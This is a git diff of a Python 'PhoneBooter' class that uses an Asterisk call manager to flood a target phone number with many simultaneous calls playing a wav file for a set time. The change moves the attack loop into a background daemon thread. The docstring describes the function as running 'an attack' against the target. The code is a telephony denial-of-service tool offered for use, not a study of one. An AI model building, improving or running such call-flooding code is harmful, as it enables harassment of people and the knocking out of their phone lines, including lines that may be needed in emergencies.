@@ -1,13 +1,14 @@
 import asyncio
+import threading
 from panoramisk.call_manager import CallManager
 from libs.generaterandoms import GenerateRandoms
 
 
 class PhoneBooter(object):
 
-    def __init__(self, targetNum, numThreads, bootLength, wav):
+    def __init__(self):
 
-        self.start(targetNum, numThreads, bootLength, wav)
+        self.loop = asyncio.get_event_loop()
 
     @asyncio.coroutine
     def originate(self, targetNum, wav):
@@ -47,15 +48,19 @@ class PhoneBooter(object):
         await asyncio.sleep(when)
         loop.stop()
 
-
     def start(self, targetNum, numThreads, bootLength, wav):
+
+        thread_stop = threading.Event()
+        thread = threading.Thread(target=self.launch, args=(targetNum, numThreads, bootLength, wav),
+                                  name=targetNum)
+        thread.daemon = True
+        thread.start()
+
+    def launch(self, targetNum, numThreads, bootLength, wav):
         """Run an attack for the specified number of seconds against the target."""
-        loop = asyncio.get_event_loop()
+
         for x in list(range(numThreads)):
-            loop.create_task(self.originate(targetNum, wav))
+            self.loop.create_task(self.originate(targetNum, wav))
 
-        loop.create_task(self.stop_after(loop, bootLength))
-
-        # loop.run_until_complete(originate(targetNum))
-        loop.run_forever()
-        loop.close()
+        self.loop.create_task(self.stop_after(self.loop, bootLength))
+        self.loop.run_forever()
